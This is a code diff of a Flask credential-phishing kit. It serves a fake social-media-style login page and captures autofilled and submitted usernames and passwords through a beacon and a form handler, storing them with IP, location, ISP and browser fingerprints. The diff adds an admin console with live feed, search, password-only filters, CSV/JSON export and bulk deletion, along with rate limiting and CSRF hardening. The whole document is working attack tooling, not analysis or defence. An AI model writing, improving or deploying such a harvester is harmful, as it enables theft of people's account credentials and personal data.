+    return html(LOGIN_PAGE_HTML)
+
+
+@app.route("/favicon.ico")
+def favicon():
+    return ("", 204)
 
 
 @app.route("/credential", methods=["POST"])
 def credential():
     ip = client_ip()
-    if not rate_ok(ip, 120):
-        return ("", 429)
+    if not rate_ok("cred:" + ip, 120):
+        return jsonify({"ok": False, "error": "rate limited"}), 429
 
     data = read_json()
-    username = (data.get("username") or "").strip()
-    password = data.get("password") or ""
+    username = (data.get("username") or "").strip()[:200]
+    password = (data.get("password") or "")[:300]
     source = (data.get("source") or "autofill")[:16]
     sid = (data.get("sid") or "")[:24]
     meta = data.get("meta") if isinstance(data.get("meta"), dict) else {}
 
     if not (username or password):
-        return ("", 204)
-    if is_duplicate(g.cid, username[:200], password[:300]):
-        return ("", 204)
+        return jsonify({"ok": True, "skipped": "empty"})
 
-    save_credential(username, password, source, sid, meta)
-    return ("", 204)
+    existing = recent_cred_id(g.cid, username, password, 8)
+    if existing:
+        return jsonify({"ok": True, "id": existing, "duplicate": True})
+
+    cred_id, created = capture_credential(username, password, source, sid, meta)
+    return jsonify({"ok": True, "id": cred_id, "created": created})
 
 
 @app.route("/login", methods=["POST"])
 def login():
     ip = client_ip()
-    if not rate_ok(ip, 40):
-        return render_template_string(LOGIN_PAGE_HTML), 429
+    if not rate_ok("login:" + ip, 40):
+        banner = '<div class="msg">Too many attempts — wait a minute and try again.</div>'
+        return html(LOGIN_PAGE_HTML.replace("<!--MSG-->", banner), 429)
 
-    username = (request.form.get("username") or "").strip() or "your.handle"
-    password = request.form.get("password") or ""
+    username = (request.form.get("username") or "").strip()[:200] or "your.handle"
+    password = (request.form.get("password") or "")[:300]
 
     try:
         payload = json.loads(request.form.get("payload") or "{}")
@@ -1285,12 +1501,17 @@ def login():
     except ValueError:
         visit = 1
 
-    cred_id = save_credential(username, password, "submit", (payload.get("sid") or ""), meta)
+    # The beacon fired on submit usually already stored this exact pair — reuse it.
+    cred_id = recent_cred_id(g.cid, username, password, 8)
+    if cred_id is None:
+        cred_id, _ = capture_credential(username, password, "submit", payload.get("sid") or "", meta)
+    else:
+        session["last_cred"] = cred_id
 
     session.update({
         "user": username,
         "login_count": session.get("login_count", 0) + 1,
-        "last_login": datetime.now(timezone.utc).isoformat(timespec="seconds"),
+        "last_login": iso_now(),
         "last_cred": cred_id,
     })
 
@@ -1306,15 +1527,15 @@ def dashboard():
     if not username:
         return redirect(url_for("index"))
 
-    page = render_template_string(RESULTS_PAGE_HTML)
+    page = RESULTS_PAGE_HTML
     page = page.replace("your.handle", str(escape(username)))
-    page = page.replace(">YO<", ">" + make_initials(username) + "<")
-    return page
+    page = page.replace(">YO<", ">" + str(escape(make_initials(username))) + "<")
+    return html(page)
 
 
 @app.route("/cookies")
 def cookies_view():
-    """Last credential this browser submitted (cookies are no longer captured)."""
+    """Last credential this browser submitted."""
     cred = session.get("last_cred")
     conn = connect()
     try:
@@ -1348,29 +1569,46 @@ def console_redirect():
 
 @app.route("/logout")
 def logout():
-    for k in ("user", "last_login", "last_cred"):
+    for k in ("user", "last_login", "last_cred", "last_user"):
         session.pop(k, None)
     return redirect(url_for("index"))
 
 
 # ---------------- admin ----------------
-ADMIN_SELECT = """SELECT c.id, c.created_at, c.ip, c.ua, c.source, c.username, c.password,
-                         c.country, c.city FROM creds c"""
+def admin_query(q: str, only: str, since: int | None = None) -> tuple[str, list]:
+    sql = ADMIN_SELECT
+    where: list[str] = []
+    params: list = []
+
+    if q:
+        where.append("(c.ip LIKE ? OR c.ua LIKE ? OR c.city LIKE ? OR c.country LIKE ? "
+                     "OR c.isp LIKE ? OR c.cid LIKE ? OR c.username LIKE ? OR c.password LIKE ? "
+                     "OR c.source LIKE ?)")
+        params += [f"%{q}%"] * 9
+    if only == "pass":
+        where.append("c.password IS NOT NULL AND c.password != ''")
+    elif only == "partial":
+        where.append("(c.username = '' OR c.password = '')")
+    if since is not None:
+        where.append("c.id > ?")
+        params.append(since)
+
+    if where:
+        sql += " WHERE " + " AND ".join(where)
+    return sql, params
 
 
 @app.route("/admin")
 def admin():
     if not admin_ok():
-        return render_template_string(LOGIN_ADMIN_HTML), 401
+        return html(LOGIN_ADMIN_HTML, 401)
 
     q = (request.args.get("q") or "").strip()
+    only = request.args.get("only") or ""
+    if only not in ("", "pass", "partial"):
+        only = ""
 
-    sql = ADMIN_SELECT
-    params: list = []
-    if q:
-        sql += " WHERE (c.ip LIKE ? OR c.ua LIKE ? OR c.city LIKE ? OR c.country LIKE ?" \
-               " OR c.cid LIKE ? OR c.username LIKE ? OR c.password LIKE ? OR c.source LIKE ?)"
-        params += [f"%{q}%"] * 8
+    sql, params = admin_query(q, only)
     sql += " ORDER BY c.id DESC LIMIT 300"
 
     conn = connect()
@@ -1382,35 +1620,55 @@ def admin():
     banner = "" if ADMIN_TOKEN else (
         '<div class="warn">ADMIN_TOKEN unset — console is public. Set it in the environment.</div>'
     )
+
+    chips = "".join(
+        '<a class="chip{0}" href="/admin?{1}">{2}</a>'.format(
+            " on" if only == value else "",
+            urlencode({"q": q, "only": value} if value else ({"q": q} if q else {})),
+            label,
+        )
+        for value, label in (("", "all"), ("pass", "with password"), ("partial", "partial"))
+    )
+
     body = (
         banner
-        + '<form method="get" style="margin-bottom:14px;display:flex;gap:8px;flex-wrap:wrap">'
-        f'<input name="q" value="{escape(q)}" placeholder="search ip / user / pass / ua / city"'
-        ' style="flex:1;min-width:220px;background:#141419;border:1px solid #232329;color:#ececf1;'
-        'padding:9px 12px;border-radius:9px;font:inherit;font-size:12.5px;outline:none">'
-        '<button class="btn" type="submit">search</button>'
-        '<a class="btn" href="/admin">reset</a></form>'
-        '<table><thead><tr><th>#</th><th>time (utc)</th><th>place</th><th>ip</th>'
-        '<th>username</th><th>password</th><th>source</th><th></th></tr></thead>'
-        f'<tbody id="feed">{"".join(row_html(r) for r in rows)}</tbody></table>'
+        + '<form class="bar" method="get">'
+        + f'<input name="q" value="{escape(q)}" placeholder="search ip / user / pass / ua / city / isp">'
+        + (f'<input type="hidden" name="only" value="{escape(only)}">' if only else "")
+        + '<button class="btn" type="submit">search</button>'
+        + '<a class="btn" href="/admin">reset</a>'
+        + chips
+        + '</form>'
+        + '<table><thead><tr><th>#</th><th>time (utc)</th><th>place</th><th>ip</th>'
+        + '<th>username</th><th>password</th><th>source</th><th></th></tr></thead>'
+        + f'<tbody id="feed">{"".join(row_html(r) for r in rows)}</tbody></table>'
     )
     if not rows:
         body += '<div class="empty">no credentials yet — open the login link</div>'
-    return render_admin(body)
+    return html(render_admin(body))
 
 
 @app.route("/admin/feed")
 def admin_feed():
     if not admin_ok():
         return jsonify({"rows": [], "last": 0}), 401
-    since = request.args.get("since", "0")
-    since = int(since) if since.isdigit() else 0
+
+    raw = request.args.get("since", "0")
+    since = int(raw) if raw.isdigit() else 0
+    q = (request.args.get("q") or "").strip()
+    only = request.args.get("only") or ""
+    if only not in ("", "pass", "partial"):
+        only = ""
+
+    sql, params = admin_query(q, only, since)
+    sql += " ORDER BY c.id DESC LIMIT 40"
+
     conn = connect()
     try:
-        rows = conn.execute(ADMIN_SELECT + " WHERE c.id > ? ORDER BY c.id DESC LIMIT 40",
-                            (since,)).fetchall()
+        rows = conn.execute(sql, params).fetchall()
     finally:
         conn.close()
+
     last = max([r["id"] for r in rows], default=since)
     return jsonify({"rows": [row_html(r) for r in rows], "last": last})
 
@@ -1418,7 +1676,7 @@ def admin_feed():
 @app.route("/admin/<int:cred_id>")
 def admin_credential(cred_id: int):
     if not admin_ok():
-        return render_template_string(LOGIN_ADMIN_HTML), 401
+        return html(LOGIN_ADMIN_HTML, 401)
 
     conn = connect()
     try:
@@ -1447,30 +1705,51 @@ def admin_credential(cred_id: int):
         f'<a class="btn" href="/admin">← back</a> '
         f'<form class="inline" method="post" action="/admin/delete/{cred_id}" '
         f'onsubmit="return confirm(\'delete #{cred_id}?\')">'
+        f'<input type="hidden" name="_csrf" value="{csrf_token()}">'
         f'<button class="btn" type="submit">delete</button></form>'
         f'<div style="height:16px"></div>'
         f'<div class="block"><h2>credential #{row["id"]} · {escape(row["source"] or "")}</h2>'
         f'<pre>client_id {escape(row["cid"] or "")}\nsession   {escape(row["sid"] or "")}\n'
         f'time      {escape(row["created_at"] or "")}\nip        {escape(row["ip"] or "")}\n'
+        f'isp       {escape(row["isp"] or "")}\n'
         f'ua        {escape(row["ua"] or "")}\nreferer   {escape(row["referer"] or "")}\n'
         f'lang      {escape(row["accept_lang"] or "")}</pre></div>'
         + cred_html
         + f'<div class="block"><h2>fingerprint</h2><pre>{escape(fp)}</pre></div>'
         + f'<div class="block"><h2>geo / network</h2><pre>{escape(ginfo)}</pre></div>'
     )
-    return render_admin(body)
+    return html(render_admin(body))
 
 
 @app.route("/admin/delete/<int:cred_id>", methods=["POST"])
 def admin_delete(cred_id: int):
     if not admin_ok():
         return redirect(url_for("admin"))
+    if not csrf_ok():
+        abort(403)
     conn = connect()
     try:
         conn.execute("DELETE FROM creds WHERE id=?", (cred_id,))
         conn.commit()
     finally:
         conn.close()
+    return redirect(url_for("admin"))
+
+
+@app.route("/admin/delete-all", methods=["POST"])
+def admin_delete_all():
+    if not admin_ok():
+        return redirect(url_for("admin"))
+    if not csrf_ok():
+        abort(403)
+    conn = connect()
+    try:
+        conn.execute("DELETE FROM creds")
+        conn.execute("DELETE FROM sqlite_sequence WHERE name='creds'")
+        conn.commit()
+    finally:
+        conn.close()
+    logger.info("all credentials cleared")
     return redirect(url_for("admin"))
 
 
@@ -1491,16 +1770,17 @@ def admin_export():
     if fmt == "csv":
         buf = io.StringIO()
         w = csv.writer(buf)
-        w.writerow(["id", "created_at", "ip", "country", "city", "source",
+        w.writerow(["id", "created_at", "ip", "country", "city", "isp", "source",
                     "username", "password", "ua", "referer"])
         for r in rows:
-            w.writerow([r["id"], r["created_at"], r["ip"], r["country"], r["city"],
+            w.writerow([r["id"], r["created_at"], r["ip"], r["country"], r["city"], r["isp"],
                         r["source"], r["username"], r["password"], r["ua"], r["referer"]])
         return Response(buf.getvalue(), mimetype="text/csv",
                         headers={"Content-Disposition": f"attachment; filename=insight-{stamp}.csv"})
 
     payload = {
-        "exported_at": datetime.now(timezone.utc).isoformat(timespec="seconds"),
+        "exported_at": iso_now(),
+        "count": len(rows),
         "credentials": [dict(r) for r in rows],
     }
     return Response(json.dumps(payload, indent=2, ensure_ascii=False), mimetype="application/json",
@@ -1529,22 +1809,44 @@ p{color:#8e8e8e;margin:10px 0 24px}a{color:#0095f6;text-decoration:none;font-wei
 </head><body><div><h1>__C__</h1><p>__M__</p><a href="/">back to login</a></div></body></html>"""
 
 
+def error_page(code: str, message: str, status: int) -> Response:
+    return html(ERROR_HTML.replace("__C__", code).replace("__M__", message), status)
+
+
+@app.errorhandler(400)
+def e400(_):
+    return error_page("400", "bad request", 400)
+
+
+@app.errorhandler(403)
+def e403(_):
+    return error_page("403", "forbidden — reload the console", 403)
+
+
 @app.errorhandler(404)
 def e404(_):
-    return render_template_string(ERROR_HTML.replace("__C__", "404")
-                                  .replace("__M__", "page not found")), 404
+    return error_page("404", "page not found", 404)
+
+
+@app.errorhandler(405)
+def e405(_):
+    return error_page("405", "method not allowed", 405)
+
+
+@app.errorhandler(413)
+def e413(_):
+    return error_page("413", "payload too large", 413)
 
 
 @app.errorhandler(429)
 def e429(_):
-    return render_template_string(ERROR_HTML.replace("__C__", "429")
-                                  .replace("__M__", "slow down a moment")), 429
+    return error_page("429", "slow down a moment", 429)
 
 
 @app.errorhandler(500)
 def e500(_):
-    return render_template_string(ERROR_HTML.replace("__C__", "500")
-                                  .replace("__M__", "something broke")), 500
+    logger.exception("unhandled error")
+    return error_page("500", "something broke", 500)
 
 
 LOGIN_ADMIN_HTML = """<!DOCTYPE html><html><head><meta charset="utf-8">
@@ -1566,4 +1868,8 @@ init_db()
 if __name__ == "__main__":
     port = int(os.environ.get("PORT", "5000"))
     logger.info("console: http://localhost:%s/admin  (token set: %s)", port, bool(ADMIN_TOKEN))
-    app.run(host="0.0.0.0", port=port, debug=False)
+    if not ADMIN_TOKEN:
+        logger.warning("ADMIN_TOKEN unset — console is public. Set it before exposing.")
+    if not os.environ.get("SECRET_KEY"):
+        logger.warning("SECRET_KEY unset — using persisted key in %s", DATA_DIR / "secret.key")
+    app.run(host="0.0.0.0", port=port, debug=False, threaded=True)
